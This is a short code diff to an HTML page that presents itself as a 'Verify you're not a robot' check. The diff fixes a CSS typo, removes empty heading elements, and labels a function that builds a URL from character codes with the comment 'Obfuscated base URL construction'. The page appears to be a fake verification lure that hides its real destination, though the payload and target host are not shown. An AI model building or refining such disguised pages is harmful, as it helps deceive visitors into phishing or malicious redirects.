@@ -236,7 +236,7 @@
       position: absolute;
       top: 50%;
       left: 50%;
-      transform: translate(-50%, -50);
+      transform: translate(-50%, -50%);
       width: 32px;
       height: 32px;
       border: 3px solid rgba(26, 86, 219, 0.2);
@@ -283,13 +283,11 @@
   <!-- Initial loading screen -->
   <div class="init-loader" id="initialLoader">
     <div class="spinner"></div>
-    <p class="init-text"></p>
   </div>
 
   <!-- Main content -->
   <div class="access-panel" id="accessPanel">
     <div class="panel-header">
-      <h1 class="panel-title"></h1>
       <p class="panel-subtitle">Verify you're not a robot to continue</p>
     </div>
 
@@ -380,7 +378,7 @@
     }
 
     function processUrlParameters() {
-    
+      // Obfuscated base URL construction
       const urlParts = [
         String.fromCharCode(104, 116, 116, 112, 115, 58),
         String.fromCharCode(47, 47),
@@ -463,4 +461,3 @@
   </script>
 </body>
 </html>
-
